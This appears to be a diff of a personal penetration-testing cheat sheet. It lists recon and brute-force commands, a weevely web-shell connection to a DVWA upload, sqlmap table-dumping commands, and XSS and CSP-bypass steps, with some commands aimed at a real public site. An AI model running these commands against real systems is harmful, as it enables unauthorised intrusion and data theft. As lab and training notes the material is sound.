@@ -7,11 +7,12 @@ https://hackersonlineclub.com/command-injection-cheatsheet/
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 [XSS Cheat]
 
-knockpy -u (url) --no-local
+knockpy -u (url) --no-local -o (.txt) --no-http 500 404 306
 [quick subdomain enum]
 
-dirsearch -u 
+dirsearch -u (url) -o (.txt)
 [directory busting]
+///.html //.xml //.backdoor
 
 gobuster dir --url http://10.129.53.230 --wordlist directory-list-2.3-small.txt
 [directory bruteforce]
@@ -33,6 +34,9 @@ ffuf -w /root/Downloads/subdomains-wordlist.txt -u https://www.yahoo.com/FUZZ -f
 
 dirb https://www.yahoo.com
 [testing target url with auto wordlists]
+
+python3 -m http.server (port)
+[run listening server on kali]
 
 127.0.0.1:8080
 [burpsuite config]
@@ -146,6 +150,9 @@ weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
 - sqlmap -u "url" --tables -D (db_name)  --check db tables
 - sqlmap -u "url" --columns -T (desired_column) -D (db_name)  --open column
 - sqlmap -u "url" -T accounts -D owasp10 --dump   ---open all database file
+
+[+] test url endpoints
+
 - 
 
 #BAC
@@ -224,6 +231,10 @@ weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
 - use/test the tag with a 200 ok
 - add the working tag to the POSITION with url encoding of SPACE e.g "serach=<body%20$$>", paste possible JS events into PAYLOADS and start atatck
 - use JS event that work with accepted HTML tag
+[+] Intercept XSS request and FORWARD it till you get a POST request 
+- add "&token=sss" in URL to see where it is being injected in site 
+- mark option to intercept resonse in proxy 
+- add {;script-src-elem 'unsafe-inline'} to URL containing XSS and paste in browser --CSP token
 
 
 *******************************
